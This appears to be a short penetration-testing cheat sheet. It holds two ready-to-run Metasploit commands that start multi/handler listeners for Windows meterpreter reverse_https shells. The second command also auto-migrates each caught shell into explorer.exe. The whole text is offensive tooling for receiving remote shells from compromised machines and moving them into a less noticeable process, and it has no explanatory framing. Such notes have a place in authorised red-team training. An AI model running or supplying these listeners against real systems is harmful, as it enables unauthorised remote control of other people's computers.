> Start Generic Listener:

```
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.x.x; set lport <port>; run"
```

> Start Auto Migrate Listener (This will auto migrate the shell upon receiving a connection):

```
sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set lhost 192.168.x.x; set lport <port>; set AutoRunScript post/windows/manage/migrate SPAWN=false NAME=explorer.exe; run"
```

